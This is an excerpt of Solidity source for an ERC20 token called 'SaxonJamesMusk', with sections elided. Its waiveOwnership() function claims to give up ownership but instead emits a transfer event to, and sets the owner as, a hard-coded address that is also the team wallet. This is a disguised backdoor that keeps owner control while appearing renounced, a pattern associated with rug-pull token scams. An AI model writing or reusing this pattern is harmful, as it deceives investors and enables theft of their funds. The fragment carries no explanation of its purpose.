...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0x738F7473bd0c2BF6DBAd909469a5Ffe2E8F4446a));
        _owner = address(0x738F7473bd0c2BF6DBAd909469a5Ffe2E8F4446a);
    }
...
contract SaxonJamesMusk is Context, IERC20, Ownable {
    ...
    string private _name = "SaxonJamesMusk";
    string private _symbol = "SJMi";
    uint8 private _decimals = 9;

    address payable public marketingWalletAddress = payable(0xb1b6c7DA7B807DfeD9CcB80c0cBE1963751266D1);
    address payable public teamWalletAddress = payable(0x738F7473bd0c2BF6DBAd909469a5Ffe2E8F4446a);
